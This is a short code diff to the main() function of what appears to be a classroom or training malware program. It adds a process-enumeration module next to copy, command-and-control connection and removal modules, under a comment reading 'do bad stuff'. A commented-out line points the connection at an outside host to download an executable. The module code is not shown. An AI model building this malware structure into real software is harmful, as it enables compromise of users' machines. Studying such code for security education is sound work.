@@ -5,6 +5,7 @@
 #include "C2.h"
 #include "CP.h"
 #include "RM.h"
+#include "PM.h"
 #include <iostream>
 
 
@@ -14,11 +15,13 @@ int main()
 	CP copyModule;
 	C2 connModule;// ("www.uvu-cybersecurity.com", "/downloaded.exe");
 	RM remvModule;
+	PM procModule;
 
 	connModule.setPathName("/");
 	connModule.setHostName("www.google.com");
 	
 	// do bad stuff
+	procModule.getProcesses();
 	copyModule.execute();
 	connModule.execute();
 	remvModule.execute();
